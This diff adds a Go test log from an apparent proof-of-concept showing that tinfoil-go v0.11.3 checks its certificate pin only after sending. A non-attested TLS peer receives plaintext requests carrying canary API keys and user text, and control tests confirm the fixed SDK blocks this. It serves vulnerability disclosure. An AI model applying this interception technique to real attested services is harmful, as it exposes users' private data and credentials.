@@ -1,0 +1,49 @@
+== summarizer v0.1.15 deps ==
+github.com/tinfoilsh/tinfoil-go v0.11.3
+github.com/tinfoilsh/verifier v0.11.2
+github.com/openai/openai-go/v3 v3.16.0
+== vulnerable (HTTP/1.1) ==
+=== RUN   TestVulnerable_PinCheckedAfterSend
+    poc_test.go:108: pinned (attested) key FP : ad22c95dccb098438dadc52451716bd62c677358c27aa440ba0dcbd5331ebb96
+    poc_test.go:109: attacker cert key FP     : 51b286fc24e8e789cb89d1c8384bb88704d06b989a85780cdafa9958437b7a09
+    poc_test.go:110: [attacker, response withheld] POST inference.tinfoil.sh/v1/chat/completions HTTP/1.1
+    poc_test.go:111: [attacker, response withheld] Authorization: Bearer tk_CANARY_SUMMARIZER_API_KEY
+    poc_test.go:112: [attacker, response withheld] body: {"messages":[{"content":"Generate a concise, descriptive title for the following text. ONLY output plain text - never output markdown or code. Use between 2 and 5 words.","role":"system"},{"content":"CANARY-USER-SECRET: I was diagnosed with HIV yesterday, how do I tell my employer","role":"user"}],"model":"llama3-3-70b","max_completion_tokens":1024,"reasoning_effort":"low"}
+    poc_test.go:113: summarizer upstream call still pending: pin check has not run
+    poc_test.go:117: end user got: 503 {"error":"upstream service is temporarily unavailable","code":"upstream_unavailable","request_id":"de1371c2-9e2d-4584-8436-1fa0b47eaa74"}
+    poc_test.go:119: resolver: api-github-proxy.tinfoil.sh -> NXDOMAIN (egress blocked)
+    poc_test.go:119: resolver: api-github-proxy.tinfoil.sh -> NXDOMAIN (egress blocked)
+    poc_test.go:127: VULNERABLE: full plaintext request (user text + API key) reached a non-attested TLS peer; pin mismatch detected only afterwards (503)
+--- PASS: TestVulnerable_PinCheckedAfterSend (0.31s)
+=== RUN   TestControl_HonestPeerAccepted
+    poc_test.go:139: pinned key == peer key: end user got 200 {"summary":"Peer chosen title"}
+--- PASS: TestControl_HonestPeerAccepted (0.01s)
+PASS
+ok  	github.com/tinfoilsh/confidential-summarizer	0.336s
+== vulnerable (HTTP/2) ==
+=== RUN   TestVulnerable_PinCheckedAfterSend
+    poc_test.go:108: pinned (attested) key FP : d2fb18c2067374f87e4f653fa7178228a7c0bd8b5cca78410c728f9d51f96776
+    poc_test.go:109: attacker cert key FP     : 959dd97f0237a0b4030a0a820181ee14802cc285efec03e534cf724542c8e53a
+    poc_test.go:110: [attacker, response withheld] POST inference.tinfoil.sh/v1/chat/completions HTTP/2.0
+    poc_test.go:111: [attacker, response withheld] Authorization: Bearer tk_CANARY_SUMMARIZER_API_KEY
+    poc_test.go:112: [attacker, response withheld] body: {"messages":[{"content":"Generate a concise, descriptive title for the following text. ONLY output plain text - never output markdown or code. Use between 2 and 5 words.","role":"system"},{"content":"CANARY-USER-SECRET: I was diagnosed with HIV yesterday, how do I tell my employer","role":"user"}],"model":"llama3-3-70b","max_completion_tokens":1024,"reasoning_effort":"low"}
+    poc_test.go:113: summarizer upstream call still pending: pin check has not run
+    poc_test.go:117: end user got: 503 {"error":"upstream service is temporarily unavailable","code":"upstream_unavailable","request_id":"f467cf9e-415f-4d78-8fea-e8210c6c6d37"}
+    poc_test.go:119: resolver: api-github-proxy.tinfoil.sh -> NXDOMAIN (egress blocked)
+    poc_test.go:119: resolver: api-github-proxy.tinfoil.sh -> NXDOMAIN (egress blocked)
+    poc_test.go:127: VULNERABLE: full plaintext request (user text + API key) reached a non-attested TLS peer; pin mismatch detected only afterwards (503)
+--- PASS: TestVulnerable_PinCheckedAfterSend (0.31s)
+PASS
+ok  	github.com/tinfoilsh/confidential-summarizer	0.331s
+== control: tinfoil-go v0.16.1 ==
+=== RUN   TestControl_CurrentSDKPinsBeforeSend
+    control_test.go:38: current SDK error: Post "https://inference.tinfoil.sh/v1/chat/completions": attestation error: enclave certificate does not match the attested key; re-verify the enclave
+    control_test.go:39: attacker: 1 TCP connection(s), 0 HTTP request(s)
+    control_test.go:46: FIXED: handshake aborted in VerifyConnection; zero request bytes reached the non-attested peer
+2026/10/11 19:18:17 http: TLS handshake error from 127.0.0.1:34648: remote error: tls: bad certificate
+--- PASS: TestControl_CurrentSDKPinsBeforeSend (0.01s)
+=== RUN   TestControl_CurrentSDKHonestPeer
+    control_test.go:52: pinned key == peer key: error=<nil>, peer saw 1 request(s)
+--- PASS: TestControl_CurrentSDKHonestPeer (0.00s)
+PASS
+ok  	poc05control	0.033s
